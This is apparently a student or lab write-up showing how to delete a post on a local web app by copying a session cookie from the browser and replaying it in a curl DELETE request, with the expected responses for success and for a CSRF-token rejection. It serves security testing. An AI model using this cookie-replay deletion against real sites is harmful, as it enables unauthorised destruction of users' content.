My attack can delete a users post in the drafts or a published post in the public feed.
I"ll show how to delete a post in the user's drafts.

How to run the malicious script:
1. Sign up to the website
2. Sign in with your info
3. Create a post 

4. Go to drafts
5. Click on your post
6. Look at the url, it will be in the form of "http://localhost:3000/p/[post_id]"
7. <post_id> = post id in the url

8. Inspect the page (F12), go to Application --> Storage --> Cookies
9. Copy the value correspnding to the name "userCookie"
Will look something like {%22token%22:%22eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImUiLCJpZCI6MTksImlhdCI6MTY5MTE1MDQxNX0.Rh7Vp1g-cq5WeV_VPt7tHDlsYe7ntx3EA4pf10qvoaQ%22%2C%22username%22:%22e%22%2C%22email%22:%22e%22%2C%22name%22:%22e%22}
10. <cookie> = cookie value that we just got 

11. Open the cmd terminal
12. Run the following command: (insert the corresponding <cookie> and <post_id>)
curl -X DELETE --cookie "userCookie=<cookie>" localhost:3000/api/post/<post_id>

*** If the attack worked, we will see the content of the post:
{"id":<post_id>,"title":<post_title>,"content":<post_content>,"videoId":<post_vid_id>,"published":<true/false>,"authorId":<author_id>}
*** If the attack didn't work, we will see:
{"message":"Invalid CSRF token"}

